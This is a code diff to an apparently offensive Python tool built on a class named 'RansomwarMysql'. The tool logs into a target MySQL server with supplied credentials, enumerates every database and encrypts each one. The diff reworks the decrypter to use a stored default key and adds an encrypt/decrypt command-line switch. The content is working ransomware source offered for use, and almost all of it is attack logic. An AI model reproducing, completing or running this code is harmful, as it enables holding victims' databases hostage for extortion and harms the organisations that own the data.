@@ -16,7 +16,7 @@ class Main(RansomwarMysql):
         print(new_text)
             
     def run_encrypter(self):
-        self.print_log(f"the password encrypter : {str(self.defult_key)}")
+        self.print_log(f"the password encrypter : {self.defult_key.decode()}")
         self.print_log(f"Get Databases From  Target : {self.host}")
         databases : list = self.get_all_databases()
         for database in databases:
@@ -31,17 +31,21 @@ class Main(RansomwarMysql):
         self.print_log(f"encrypted all databases")
 
 
-    def run_decrypter(self , key:str):
+    def run_decrypter(self):
         self.print_log(f"Get Databases From  Target : {self.host}")
         databases : list = self.get_all_databases()
         for database in databases:
             self.print_log(f"connect to database : {database}")
             self.print_log(f"running decrypter")
-            result = self.decrypt_database(database_name=database , key=key)
+            result = self.decrypt_database(database_name=database , key=self.defult_key)
             if result != False:            
                 self.print_log(f"decrypted database : {database}")
         self.print_log(f"decrypted all databases")
         
 if __name__ == "__main__":
-    app = Main(attack_method='mysql' , host=args[1] , username=args[2] , password=args[3] , key=args[4])
-    app.run_encrypter()
+     
+    app = Main(attack_method='mysql' , host=args[2] , username=args[3] , password=args[4] , key=args[5])
+    if argv[1] == "encrypt": 
+         app.run_encrypter()
+    else: 
+        app.run_decrypter() 
